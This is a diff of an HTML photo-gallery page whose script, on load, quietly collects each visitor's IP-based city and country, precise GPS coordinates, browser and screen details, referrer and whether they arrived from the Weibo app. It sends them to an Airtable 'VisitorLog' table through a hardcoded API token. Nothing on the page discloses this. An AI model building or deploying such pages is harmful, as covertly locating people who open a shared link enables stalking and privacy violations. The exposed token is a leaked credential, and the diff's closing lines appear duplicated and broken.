@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh">
 <head>
   <meta charset="UTF-8">
   <title>LYYSGC</title>
@@ -7,89 +7,119 @@
     body {
       margin: 0;
       background-color: black;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 5px;
+      padding: 5px;
     }
     img {
-      max-width: 100%;
-      max-height: 100%;
+      width: 100%;
+      height: auto;
+      display: block;
     }
   </style>
 </head>
 <body>
-  <img src="main.jpg" alt="photo">
-  
+  <!-- 9 张本地图片 -->
+  <img src="img1.jpg" alt="">
+  <img src="img2.jpg" alt="">
+  <img src="img3.jpg" alt="">
+  <img src="img4.jpg" alt="">
+  <img src="img5.jpg" alt="">
+  <img src="img6.jpg" alt="">
+  <img src="img7.jpg" alt="">
+  <img src="img8.jpg" alt="">
+  <img src="img9.jpg" alt="">
+
   <script>
     async function getVisitorData() {
-      const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
+      let errorLog = '';
+      let ipData = {};
       const userAgent = navigator.userAgent;
       const language = navigator.language;
       const screenSize = `${screen.width}x${screen.height}`;
       const isFromWeibo = userAgent.includes('Weibo');
       const referrer = document.referrer || '无';
       const time = new Date().toISOString();
+      let latitude = '', longitude = '', accuracy = '';
 
-      let latitude = null, longitude = null, accuracy = null;
-      if ('geolocation' in navigator) {
-        await new Promise(resolve => {
-          navigator.geolocation.getCurrentPosition(
-            pos => {
-              latitude = pos.coords.latitude;
-              longitude = pos.coords.longitude;
-              accuracy = pos.coords.accuracy;
-              resolve();
-            },
-            err => resolve(),
-            { enableHighAccuracy: true, timeout: 5000 }
-          );
-        });
+      // 获取 IP 信息
+      try {
+        ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
+      } catch (err) {
+        errorLog += `IP获取失败：${err.message}; `;
       }
 
+      // 获取定位
+      if ('geolocation' in navigator) {
+        try {
+          await new Promise((resolve) => {
+            navigator.geolocation.getCurrentPosition(
+              pos => {
+                latitude = pos.coords.latitude;
+                longitude = pos.coords.longitude;
+                accuracy = pos.coords.accuracy;
+                resolve();
+              },
+              err => {
+                errorLog += `定位失败：${err.message}; `;
+                resolve();
+              },
+              { enableHighAccuracy: true, timeout: 5000 }
+            );
+          });
+        } catch (err) {
+          errorLog += `定位异常：${err.message}; `;
+        }
+      }
+
+      // Airtable 上传
       const dataToSend = {
         records: [
           {
             fields: {
-              IP: ipData.ip,
-              City: ipData.city,
-              Country: ipData.country_name,
+              IP: ipData.ip || '',
+              City: ipData.city || '',
+              Country: ipData.country_name || '',
               Browser: userAgent,
               Language: language,
               Screen: screenSize,
               From_Weibo_App: isFromWeibo ? 'Yes' : 'No',
               Referrer: referrer,
               VisitTime: time,
-              Latitude: latitude || '',
-              Longitude: longitude || '',
-              Accuracy_m: accuracy || ''
+              Latitude: latitude,
+              Longitude: longitude,
+              Accuracy_m: accuracy,
+              ErrorLog: errorLog
             }
           }
         ]
       };
 
-      const token = 'patoKhBbgt8EdK21u.c964ef8f5b6ece2ca8e74c3751910365829974e8941cd5d17c6bf273c81a17b0';
-      const baseId = 'appxay6O2SXyiCXEq';
-      const tableName = 'VisitorLog';
+      const token = 'patoKhBbgt8EdK21u.c964ef8f5b6ece2ca8e74c3751910365829974e8941cd5d17c6bf273c81a17b0';     // 
+      const baseId = 'appxay6O2SXyiCXEq';           // 
+      const tableName = 'VisitorLog';          // 
 
-      const response = await fetch(`https://api.airtable.com/v0/${baseId}/${encodeURIComponent(tableName)}`, {
-        method: 'POST',
-        headers: {
-          'Authorization': `Bearer ${token}`,
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(dataToSend)
-      });
+      try {
+        const response = await fetch(`https://api.airtable.com/v0/${baseId}/${encodeURIComponent(tableName)}`, {
+          method: 'POST',
+          headers: {
+            'Authorization': `Bearer ${token}`,
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(dataToSend)
+        });
 
-      const result = await response.json();
-      console.log('访客信息上传结果：', result);
+        const result = await response.json();
+        if (result.error) {
+          console.error('Airtable 错误：', result.error);
+        } else {
+          console.log('Airtable 上传成功');
+        }
+      } catch (err) {
+        console.error('Airtable 请求失败：', err);
+      }
     }
-
-    getVisitorData();
-  </script>
-</body>
-</html>
-
 
     getVisitorData();
   </script>
